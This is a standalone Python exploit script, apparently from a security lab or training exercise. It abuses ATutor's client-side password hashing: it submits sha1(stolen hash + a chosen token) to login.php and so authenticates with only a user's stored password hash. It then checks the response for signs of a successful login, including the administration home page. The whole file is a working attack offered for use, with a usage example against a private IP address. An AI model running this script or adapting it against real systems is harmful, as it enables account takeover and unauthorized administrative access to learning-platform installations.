import sys, hashlib, requests

def gen_hash(passwd, token):
    return hashlib.sha1((passwd + token).encode()).hexdigest()

def we_can_login_with_a_hash():
    target = "http://%s/ATutor/login.php" % sys.argv[1]
    token = "hax"
    hashed = gen_hash(sys.argv[3], token)
    d = {
            "form_password_hidden" : hashed,
            "form_login": sys.argv[2],
            "submit": "Login",
            "token" : token
    }
    s = requests.Session()
    r = s.post(target, data = d)
    res = r.text
    
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res or "Home: Administration" in res:
        return True
    return False

def main():
    if len(sys.argv) != 4:
        print("(+) usage: %s <target> <user> <hash>" % sys.argv[0])
        print("(+) eg: %s 192.168.121.103 atutor 56b11a0603c7b7b8b4f06918e1bb5378ccd481cc" % sys.argv[0])
        sys.exit(-1)

    if we_can_login_with_a_hash():
        print("(+) success!")
    else:
        print("(-) failure!")

if __name__ == "__main__":
    main()
